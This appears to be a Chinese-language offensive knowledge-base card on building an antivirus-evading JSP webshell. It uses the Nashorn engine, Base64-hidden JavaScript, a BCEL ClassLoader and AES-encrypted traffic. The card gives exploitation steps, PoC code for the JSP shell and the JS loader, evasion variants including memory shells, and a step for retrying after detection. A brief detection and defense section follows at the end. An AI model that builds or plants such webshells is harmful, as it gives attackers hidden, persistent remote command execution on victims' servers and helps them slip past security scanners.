---
id: web-java-rce-nashorn-bcel-jsp-webshell-av-bypass
title: Nashorn 引擎 + Base64 JS + BCEL ClassLoader 的 JSP Webshell 静态免杀
type: scenario
domain: web
path: web/java/rce
technique: nashorn-bcel-jsp-webshell-evasion
aliases:
- Nashorn JSP Webshell
- BCEL ClassLoader 免杀
- Base64 JS 免杀
- JSP 木马免杀
- ScriptEngine js webshell
- 加密 JSP Webshell
tags:
- java
- jsp
- webshell
- nashorn
- bcel
- classloader
- av-bypass
- evasion
- scriptengine
- base64
- aes
cve: []
severity: high
confidence: medium
status: verified
affected_versions: JDK 8-14（内置 Nashorn；JDK 15 起移除）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V82
  verified_at: '2026-11-05T18:03:38+08:00'
  notes: 已通读全文并核对4张图：图01 为传统 JSP Webshell 与 Nashorn 绕过方案对比；图02 shell.zip 在 SHELLPUB 在线查杀 0/1 判安全；图03 shell.jsp 在微步在线 0/28 引擎检出（未知）；图04 阿里云 WHITE/正常。JSP 外壳、Base64 JS、BCEL Utility.encode/ClassLoader、AES 收发、session 缓存与变量名随机化代码均与原文一致。未验证点：原文未给出命令执行、客户端连接或回显截图，JS 中 obj.equals(data)/obj.equals(out) 依赖自定义 Payload 类实现，属协议示意，卡内 confidence=medium 已注明；三家在线扫描不能外推为通用免杀。affected_versions 为 Nashorn 运行环境约束（JDK 8-14，JDK 15 移除），非漏洞影响版本，保留。PoC 未复跑；frontmatter 无 sources/source_url。
---

## 一句话结论

在仍内置 Nashorn 的 JDK 8-14 上，JSP 文件只保留 `ScriptEngine` 初始化、把真正的恶意逻辑放进 Base64 编码的 JavaScript，再由 JS 用 BCEL ClassLoader 加载加密传输的字节码，可以不在 JSP 明文中出现 `Runtime.exec`、`ProcessBuilder`、`ClassLoader` 等静态特征，从而绕过只做关键字/模板匹配的 WebShell 查杀。

## 原理

- Nashorn 是 JDK 8 引入的 JavaScript 引擎（JDK 15 移除），`new ScriptEngineManager().getEngineByName("js")` 可在 JVM 内执行 JS；Nashorn 的 `Java.type('java.lang.Runtime')` 能直接取得任意 Java 类，等价于在 JSP 中拥有完整 Java 能力。
- JSP 外壳只包含 `Base64.getDecoder().decode(...)` 与 `ScriptEngine.eval(...)`，没有常见的 `Runtime.getRuntime().exec`、`ProcessBuilder`、`defineClass`、`URLClassLoader` 等查杀关键字；恶意逻辑被 Base64 隐藏在字符串里，静态扫描看到的是高熵数据而非可读代码。
- JS 层用 BCEL 动态加载字节码：`com.sun.org.apache.bcel.internal.classfile.Utility.encode(bytes, true)` 生成 `$$BCEL$$...` 形式的类名，再交给 `com.sun.org.apache.bcel.internal.util.ClassLoader` 的 `Class.forName` 解析。BCEL 类名与常规 `ClassLoader` 调用差异较大，容易绕过基于类名/方法名的规则。
- 请求体和响应体用 AES 加密，命令与执行结果不以明文出现在流量中；首次请求把加载好的 Payload 类缓存在 `session`，后续请求只发送加密命令，降低“明文命令参数”这一行为特征。
- 变量名由生成器随机化（如 `_a3c8f`、`_b2d5g7m`），JSP 结构每次不同，进一步降低模板/哈希类检测的命中率。
- 该方案只针对静态特征与简单流量特征：语义分析（识别 ScriptEngine + Base64 + BCEL 组合）、运行时行为（ScriptEngine 初始化、BCEL 类加载、JSP 编译后进程派生）仍可发现；作者测试的 0/28 只代表当时几个在线引擎的结果，不能外推为通用免杀。

## 触发条件

- 目标 JDK 为 8-14（内置 Nashorn）；JDK 15+ 默认已移除 Nashorn，需要额外引入引擎。
- 攻击者能向 Web 根写入/上传 `.jsp` 文件，且该路径可被容器编译执行。
- 目标未禁用 `javax.script.ScriptEngineManager`，且类路径保留 `com.sun.org.apache.bcel` 内部类。
- 查杀主要依赖静态关键字、模板或简单熵值检测，未对 Base64/JS 做深度解码与语义分析。
- 攻击者能与 Shell 交换 AES 密文（首次上传 Payload 类，后续下发命令）。

## 利用步骤

1. 编写一个 Java Payload 类，把命令执行逻辑放在 `equals` 等可被 JS 调用的方法中，编译得到 class 字节码。
2. 用共享 AES 密钥加密 class 字节码；生成 Base64 编码的 JS 装载逻辑（含 BCEL 编码与 `Class.forName`）。
3. 把 Base64 JS 填入 JSP 外壳模板，随机化变量名，生成最终 `.jsp` 文件。
4. 通过上传/写入/包含等入口把 JSP 落地到 Web 可访问目录，访问确认页面不报错。
5. 第一次请求发送加密后的 Payload 类；Shell 用 `loadClass` 加载并缓存在 session。
6. 后续请求发送 AES 加密命令；Shell 执行后把结果加密回传，客户端解密查看。
7. 若被查杀，调整 JSP 外壳结构、变量名、Base64 分段、AES 密钥与类名生成方式后重试；同时测试目标是否真的执行（不要只看扫描结果）。

## PoC

```jsp
<%@ page import="javax.script.*" %>
<%
try {
    String js = new String(java.util.Base64.getDecoder().decode("BASE64_JS"));
    ScriptEngine e = new ScriptEngineManager().getEngineByName("js");
    e.put("request", request);
    e.put("response", response);
    e.put("session", session);
    e.eval(js);
} catch (Exception ignored) {}
%>
```

```javascript
// Base64 解码后的 JS 关键逻辑（示意）
var U  = Java.type('com.sun.org.apache.bcel.internal.classfile.Utility');
var CL = Java.type('com.sun.org.apache.bcel.internal.util.ClassLoader');
var bytes = /* AES 解密 request body 得到的 class 字节码 */;
var name = '$$BCEL$$' + U.encode(bytes, true);
var cls  = java.lang.Class.forName(name, true, new CL());
session.setAttribute('p', cls);          // 首次请求缓存
var obj = session.getAttribute('p').newInstance();
obj.equals(decryptedCommand);            // 后续请求执行
```

```text
# 客户端流程
1) AES 加密 Payload.class -> POST body
2) 服务端返回加密的加载结果
3) AES 加密命令 -> POST body -> 解密响应
```

## 变体与关联

- 变体：把 Nashorn 换成 Groovy/Jython/BeanShell 等 `ScriptEngine`，或使用独立引入的 Nashorn/GraalJS；JSP 外壳可改为 JSPX、标签文件或 Servlet 动态注册。
- 变体：BCEL 仅作为加载器之一，也可用反射 `Class.forName` + 自定义 ClassLoader、`defineClass`、`Unsafe.defineAnonymousClass`、内存马等方式；加密层可换成异或、RC4、分块 Base64。
- 变体：把 Payload 类缓存在 session/application/ServletContext，形成半内存型 Webshell；结合 JSP 编码/特殊闭合绕过可进一步规避静态规则。
- 关联：[[web-java-rce-jsp-pageencoding-static-detection-bypass]]（JSP 源码编码免杀）、[[web-java-rce-jsp-scriptlet-special-closure-bypass]]（JSP 结构闭合免杀）、[[web-java-rce-jsp-trim-whitespace-fragment-bypass]]（JSP 片段免杀）、[[web-generic-file-upload-encrypted-webshell-av-bypass]]（PHP 加密 WebShell 的同类思路）、[[web-java-classloader-unsafe-anonymous-class-jsp-shell]]（另一种 JSP 动态类加载 Shell）。
- 边界：JDK 15+ 无内置 Nashorn、目标移除 BCEL 内部类、JSP 目录不可执行、上传被扩展名/内容双重拦截、或查杀引擎能解码 Base64 并做 JS 语义分析时，该免杀不成立或大幅降级。文章仅展示三家在线扫描结果，未展示命令执行交互，实际可用性需在目标环境验证。

## 检测与防御

- **升级/裁剪**：升级到 JDK 15+ 或移除 Nashorn；生产环境不需要 `ScriptEngine` 时，通过 SecurityManager/模块裁剪/自定义类过滤器禁止应用加载 `javax.script` 与 Nashorn。
- **上传与 JSP 管理**：禁止上传目录执行 JSP；JSP 文件白名单与完整性校验；及时清理未知 JSP；使用预编译/只读部署。
- **静态检测**：扫描 JSP 中的 `ScriptEngineManager`、`getEngineByName("js")`、`Java.type`、`$$BCEL$$`、`com.sun.org.apache.bcel`、大段 Base64 字符串；对 Base64 解码后再做二次扫描，对 JS 做语义分析而不是只匹配关键字。
- **运行时检测**：监控 JSP 编译后加载 Nashorn/BCEL 类、`ScriptEngine` 初始化、`Class.forName` 加载 `$$BCEL$$` 类名、Web 进程派生 `sh`/`cmd`；JSP 文件创建/修改告警；异常加密 POST 流量与高熵响应。
- **加固**：Web 进程最小权限、容器只读根文件系统、WAF 拦截 JSP 上传与异常脚本内容；对 Webshell 查杀结果做多引擎复核，不依赖单一扫描器的“安全”结论。
